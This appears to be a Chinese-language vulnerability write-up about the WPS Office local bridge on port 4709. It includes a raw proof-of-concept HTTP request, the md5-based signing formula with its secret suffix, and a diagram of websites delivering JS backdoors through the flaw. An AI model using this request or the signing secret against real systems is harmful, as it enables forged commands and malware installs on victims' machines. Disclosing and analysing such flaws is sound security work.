```yaml
POST /command/invoke HTTP/1.1
Host: localhost.wbridge.wps.cn:4709
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 732
Origin: https://docs.wps.cn
Referer: https://docs.wps.cn/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-site
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua: "Google Chrome";v="114", "Chromium";v="114", "Not=A?Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Te: trailers
Connection: close

app_id=kdocs&cmd=ksoqing%3A%2F%2Ftype%3Dksolaunch%26cmd%3DcGx1Z2luOi8vcGFnZUNsb3VkRG9jcz91cmw9aHR0cHM6Ly9haXJzaGVldC1jb21tdW5pdHkud3BzLmNuLw%3d%3d%26token%3D7b542dc31594d4f443dfc073fcb8abd3&ks_local_token=2BwJYEBTwY2ueCNrylNVQhMGt8QMNR3A&nonce_str=AbQ5fb66Q23E2yG3dbSM2TQ8M4HmD7i8&t=1695719826922&sign=C16B6005259121B111BF72787186D057FF191D04D2374F47E064F7A541B3601A
```

执行完上述请求包后，会触发 wps 的 api 接口，并打开 wps 官网。攻击者的恶意负载将存储在网站中。加载后，后门将下载到指定目录并运行。

## 简单分析



我们在这里做一个简单的分析。 通过反向分析，我们发现 cmd 是 base64 编码的 WPS 官网域名，因为 WPS 只限制了部分白名单域名可以用内置浏览器打开，而那些不在白名单中的可以使用用户默认的 browser.whitelisted 域名打开，如：*.wps.cn *.wps.com *.wpscdn.cn *.kdocs.cn ....

### 关于Sign Token



```
md5(cmd + '_qingLaunchKey_')
```



# 黑客如何利用此漏洞？



我们发现中国黑客正在使用这种方法进行攻击！

```
        (attack)
hacker >>>>>>>>>> web site(Install Js Payload Backdoor)
        (access)                           (run js payload)
user   >>>>>>>>>> web site(Hacker attack)   >>>>>>>>>>  attack wps (if you start wps and 4709 open)    
```